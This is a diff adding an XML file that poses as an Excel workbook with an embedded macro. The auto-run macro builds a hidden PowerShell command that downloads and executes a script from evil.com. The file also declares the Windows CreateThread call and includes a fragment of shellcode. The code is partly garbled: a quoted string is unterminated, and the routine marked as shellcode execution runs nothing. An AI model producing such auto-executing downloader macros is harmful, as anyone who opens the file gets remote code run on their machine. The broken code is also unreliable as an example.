@@ -1,0 +1,35 @@
+<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
+<?mso-application progid="Excel.Sheet"?>
+<Workbook xmlns="urn:schemas-microsoft-com:office:spreadsheet">
+<Macros>
+<Macro Name="Auto_Open">
+<![CDATA[
+Sub Auto_Open()
+    Dim str As String
+    str = "powershell -exec bypass -nop -w hidden -c ""IEX ((new-object net.webclient).downloadstring('http://evil.com/payload.ps1'))
+    Shell str, vbHide
+End Sub
+
+Sub Workbook_Open()
+    Call Auto_Open
+End Sub
+
+' Malicious code
+Private Declare PtrSafe Function CreateThread Lib "kernel32" _
+    (ByVal lpThreadAttributes As Long, _
+     ByVal dwStackSize As Long, _
+     ByVal lpStartAddress As LongPtr, _
+     lpParameter As LongPtr, _
+     ByVal dwCreationFlags As Long, _
+     lpThreadId As Long) As LongPtr
+     
+' Shellcode execution
+Sub ExecuteShellcode()
+    ' XOR encoded shellcode
+    Dim buf As String
+    buf = "\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51"
+End Sub
+]]>
+</Macro>
+</Macros>
+</Workbook>
